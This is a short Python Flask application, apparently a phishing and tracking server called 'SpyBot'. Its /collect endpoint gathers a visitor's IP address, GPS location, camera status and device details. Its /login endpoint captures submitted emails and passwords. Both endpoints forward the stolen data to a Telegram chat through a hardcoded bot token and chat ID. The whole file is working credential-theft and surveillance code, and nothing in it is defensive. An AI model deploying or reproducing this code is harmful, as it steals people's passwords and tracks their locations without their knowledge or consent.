# main.py
from flask import Flask, render_template, request, jsonify
import requests
import telebot
import os

# Telegram Config
BOT_TOKEN = '7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg'
CHAT_ID = '6908281054'
bot = telebot.TeleBot(BOT_TOKEN)

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('spy.html')

@app.route('/collect', methods=['POST'])
def collect():
    try:
        data = request.get_json()
        user_agent = data.get('userAgent')
        latitude = data.get('latitude')
        longitude = data.get('longitude')
        camera_status = data.get('camera')
        device_info = data.get('deviceInfo')
        ip_address = request.remote_addr

        location_text = f"{latitude}, {longitude}" if latitude and longitude else "❌ Location Blocked"
        map_link = f"https://www.google.com/maps?q={latitude},{longitude}" if latitude and longitude else "Not Available"

        msg = f"\n🕵️‍♂️ Faizan™ SpyBot Alert" \
              f"\n\n🌐 IP Address: {ip_address}" \
              f"\n📍 Location: {location_text}" \
              f"\n📌 Map: {map_link}" \
              f"\n\n📷 Camera: {camera_status}" \
              f"\n🧠 Device: {device_info}" \
              f"\n🌍 UserAgent: {user_agent}"

        bot.send_message(CHAT_ID, msg)
        return "Data received"
    except Exception as e:
        return f"Error: {e}"

@app.route('/login', methods=['POST'])
def login():
    try:
        email = request.form.get('email')
        password = request.form.get('password')
        ip = request.remote_addr

        msg = f"\n🔐 Login Credentials Captured" \
              f"\n📧 Email: {email}" \
              f"\n🔑 Password: {password}" \
              f"\n🌐 IP: {ip}"

        bot.send_message(CHAT_ID, msg)
        return "<h3>✅ You are being tracked. Close the page now.</h3>"
    except Exception as e:
        return f"Error: {e}"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
